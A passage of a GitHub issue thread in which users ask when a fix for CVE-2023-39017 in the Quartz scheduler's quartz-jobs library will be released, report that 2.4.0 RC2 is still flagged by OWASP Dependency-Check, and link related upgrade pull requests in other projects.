| I see there is a RC version: [Quartz 2.4.0 RC2](https://github.com/quartz-scheduler/quartz/releases/tag/quartz-2.4.0-rc2), will it resolve this vulnerability?  We've updated to RC2 and used the [OWASP Dependency-Check](https://owasp.org/www-project-dependency-check/) maven plugin and RC2 is still identified with known vulnerabilities: `quartz-jobs-2.4.0-rc2.jar (pkg:maven/org.quartz-scheduler/quartz-jobs@2.4.0-rc2, cpe:2.3:a:softwareag:quartz:2.4.0:rc2:*:*:*:*:*:*) : CVE-2023-39017`  [image](https://private-user-images.githubusercontent.com/963014/308503515-a9b38179-074d-4295-a301-5e33687b34e9.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1MjIzNTAsIm5iZiI6MTczNjUyMjA1MCwicGF0aCI6Ii85NjMwMTQvMzA4NTAzNTE1LWE5YjM4MTc5LTA3NGQtNDI5NS1hMzAxLTVlMzM2ODdiMzRlOS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTEwJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMFQxNTE0MTBaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT0zYjYyNmQyM2FmZTUxNWRjNDZhODNlYjUwNDE1ZjRjN2Q4MjFiYjU4YjdkNWQ2NmEwMjFmYTk4ZjVlZGIyMGUzJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.uOV23iI2at8uM4pmkq_Dl82lLRXaFbVz47mNinIaGlo) |
| --- |

 üëç
1
 jc911 reacted with thumbs up emoji

All reactions

* üëç
  1 reaction

Sorry, something went wrong.

[![@danieljeremias](https://avatars.githubusercontent.com/u/3466045?s=80&u=64d68ec8e6857e237c61027dabba713755f19c95&v=4)](/danieljeremias)

Copy link

### **[danieljeremias](/danieljeremias)** commented [Mar 15, 2024](#issuecomment-2000332166) ‚Ä¢ edited Loading

| Is there a deadline to launch this fix? |
| --- |

 üëç
7
 maback77, alexander-skoblikov, xiangfu0, avmusa, Scott3377, ivrisivris, and SkippyTheMonkeyKeeper reacted with thumbs up emoji

All reactions

* üëç
  7 reactions

Sorry, something went wrong.

[![@xiangfu0](https://avatars.githubusercontent.com/u/1202120?s=40&v=4)](/xiangfu0)
[xiangfu0](/xiangfu0)
mentioned this issue
[Mar 28, 2024](#ref-pullrequest-2213835318)

[Upgrade quartz to 2.4.0-rc2 to fix CVE-2023-39017
apache/pinot#12743](/apache/pinot/pull/12743)
 Closed

[![@avmusa](https://avatars.githubusercontent.com/u/9895486?s=80&v=4)](/avmusa)

Copy link

### **[avmusa](/avmusa)** commented [Apr 11, 2024](#issuecomment-2049391910)

| Any idea of the date when the release build including [CVE-2023-39017](https://github.com/advisories/GHSA-9jc9-7p44-pm6c "CVE-2023-39017") fix will be published for v2.3.x? |
| --- |

 üëÄ
5
 jc911, Jan-Olszowka, copiiinux, SkippyTheMonkeyKeeper, and filsero reacted with eyes emoji

All reactions

* üëÄ
  5 reactions

Sorry, something went wrong.

[![@minchai23](https://avatars.githubusercontent.com/u/49991039?s=40&v=4)](/minchai23)
[minchai23](/minchai23)
mentioned this issue
[May 25, 2024](#ref-issue-2316800355)

[[Question] Is there a plan to fix the vulnerabilities in the dependency software?
apache/shiro#1497](/apache/shiro/issues/1497)

Closed

1 task

[![@adamsaghy](https://avatars.githubusercontent.com/u/7602740?s=40&v=4)](/adamsaghy)
[adamsaghy](/adamsaghy)
mentioned this issue
[May 29, 2024](#ref-pullrequest-2322134700)

[FINERACT-2089 Upgrade java dependencies/libraries
apache/fineract#3906](/apache/fineract/pull/3906)
 Merged

6 tasks

[![@ilatypov](https://avatars.githubusercontent.com/u/30419?s=40&u=c30b1c28618b204c64bd33d245f3c199c2b0481d&v=4)](/ilatypov)
[ilatypov](/ilatypov)
mentioned this issue
[Jun 5, 2024](#ref-issue-2336577784)

[require that CVE submitters publically define conditions of the attack
CVEProject/Ideas#25](/CVEProject/Ideas/issues/25)

Open

[![@haimlebo](https://avatars.githubusercontent.com/u/129649316?s=40&v=4)](/haimlebo)
[haimlebo](/haimlebo)
mentioned this issue
[Oct 14, 2024](#ref-issue-2585797582)

[[Apiiro] SCA OSS Vulnerabilities - Critical CVSS score ¬∑ Critical Risk
shukilagama/grrr#206](/shukilagama/grrr/issues/206)

Open

[![@jhouserizer](https://avatars.githubusercontent.com/u/1182369?s=40&v=4)](/jhouserizer)
[jhouserizer](/jhouserizer)
added
the
[needs:review](/quartz-scheduler/quartz/labels/needs%3Areview)
Needs review / investigation
label
[Oct 14, 2024](#event-14647784997)

[![@wilx](https://avatars.githubusercontent.com/u/1098563?s=80&v=4)](/wilx)

Copy link

### **[wilx](/wilx)** commented [Nov 15, 2024](#issuecomment-2478545074)

| Is this fixed by 2.4.0? |
| --- |

 üëÄ
5
 yh202, jtakakura, benjsmi, filsero, and rbertucat reacted with eyes emoji

All reactions

* üëÄ
  5 reactions

Sorry, something went wrong.

[![@Youli999](https://avatars.githubusercontent.com/u/98819516?s=80&u=438d9cf3329624f8d438fd01e08ceebe815dac72&v=4)](/Youli999)

Copy link

### **[Youli999](/Youli999)** commented [Dec 11, 2024](#issuecomment-2534284722)

| Validating parameters during function call passing can solve the problem, right? |
| --- |

All reactions

Sorry, something went wrong.

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fquartz-scheduler%2Fquartz%2Fissues%2F943)

Assignees

No one assigned

Labels

[needs:review](/quartz-scheduler/quartz/labels/needs%3Areview)
Needs review / investigation

Projects

None yet

Milestone

No milestone

Development

No branches or pull requests

23 participants

[![@ilatypov](https://avatars.githubusercontent.com/u/30419?s=52&v=4)](/ilatypov) [![@marcelstoer](https://avatars.githubusercontent.com/u/624195?s=52&v=4)](/marcelstoer) [![@carnil](https://avatars.githubusercontent.com/u/773068?s=52&v=4)](/carnil) [![@jbisotti](https://avatars.githubusercontent.com/u/899712?s=52&v=4)](/jbisotti) [![@rbertucat](https://avatars.githubusercontent.com/u/963014?s=52&v=4)](/rbertucat) [![@wilx](https://avatars.githubusercontent.com/u/1098563?s=52&v=4)](/wilx) [![@jhouserizer](https://avatars.githubusercontent.com/u/1182369?s=52&v=4)](/jhouserizer) [![@rolfyone](https://avatars.githubusercontent.com/u/2967240?s=52&v=4)](/rolfyone) [![@danieljeremias](https://avatars.githubusercontent.com/u/3466045?s=52&v=4)](/danieljeremias) [![@Dragas](https://avatars.githubusercontent.com/u/6078508?s=52&v=4)](/Dragas) [![@ogross74](https://avatars.githubusercontent.com/u/6479360?s=52&v=4)](/ogross74) [![@j-blandford](https://avatars.githubusercontent.com/u/9812458?s=52&v=4)](/j-blandford) [![@avmusa](https://avatars.githubusercontent.com/u/9895486?s=52&v=4)](/avmusa) [![@astonbitecode](https://avatars.githubusercontent.com/u/11261467?s=52&v=4)](/astonbitecode) [![@sergeykad](https://avatars.githubusercontent.com/u/12783618?s=52&v=4)](/sergeykad) [![@pcgeng](https://avatars.githubusercontent.com/u/13600428?s=52&v=4)](/pcgeng) [![@CalvinKirs](https://avatars.githubusercontent.com/u/16631152?s=52&v=4)](/CalvinKirs) [![@MaroIsLife](https://avatars.githubusercontent.com/u/26790542?s=52&v=4)](/MaroIsLife) [![@chadlwilson](https://avatars.githubusercontent.com/u/29788154?s=52&v=4)](/chadlwilson) [![@maxqch](https://avatars.githubusercontent.com/u/30815181?s=52&v=4)](/maxqch) and others

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.

